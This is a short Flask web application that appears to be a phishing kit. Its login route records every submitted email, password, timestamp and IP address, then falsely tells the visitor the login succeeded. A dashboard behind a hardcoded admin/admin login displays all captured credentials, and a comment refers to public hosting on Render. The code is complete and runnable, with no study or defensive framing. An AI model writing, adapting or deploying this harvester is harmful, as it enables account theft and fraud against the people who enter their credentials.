from flask import Flask, request, render_template, redirect, url_for, session, flash
import os
from datetime import datetime

app = Flask(__name__)
app.secret_key = os.urandom(24)  # For session management

# In-memory storage for submitted credentials
stored_credentials = []

@app.route('/', methods=['GET'])
def index():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    email = request.form.get('email')
    password = request.form.get('password')
    
    # Store the credentials with timestamp and IP
    stored_credentials.append({
        'email': email,
        'password': password,
        'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        'ip_address': request.remote_addr
    })
    
    # Check if admin credentials
    if email == 'admin' and password == 'admin':
        session['admin'] = True
        return redirect(url_for('admin_dashboard'))
    
    # For regular users, redirect to a "success" page
    #flash("Login successful! Redirecting to your account...")
    return redirect(url_for('success'))

@app.route('/success')
def success():
    return render_template('success.html')

@app.route('/admin')
def admin_dashboard():
    if not session.get('admin'):
        flash("Admin access required")
        return redirect(url_for('index'))
    
    return render_template('admin.html', credentials=stored_credentials)

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('index'))

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))  # Use the port Render provides
    app.run(host='0.0.0.0', port=port)
    
